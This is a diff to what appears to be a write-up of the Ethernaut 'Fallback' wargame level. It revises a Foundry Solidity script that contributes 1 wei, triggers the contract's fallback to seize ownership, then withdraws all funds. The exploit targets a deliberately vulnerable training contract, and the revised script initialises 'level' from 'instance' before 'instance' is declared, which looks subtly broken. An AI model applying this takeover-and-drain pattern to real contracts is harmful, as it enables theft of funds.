@@ -390,18 +390,17 @@ Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
 ```solidity
 contract Exploit is Script {
 
+      Fallback level = Fallback(payable(instance));
       address instance = vm.envAddress("INSTANCE_LEVEL1");
-      Fallback level = Fallback(payable(address(level_instance)));
-
-      function run() public {
-
-          vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-
+      uint256 hacker = vm.envUint("PRIVATE_KEY");   
+      address deployer = vm.rememberKey(hacker);
+      
+      function run() external {
+          vm.startBroadcast(deployer);
           level.contribute{value: 1 wei}();
           (bool sent, ) = address(level).call{value: 1 wei}("");
           require(sent, "Failed to call send()");
           level.withdraw();
-
           vm.stopBroadcast();
     }
 }
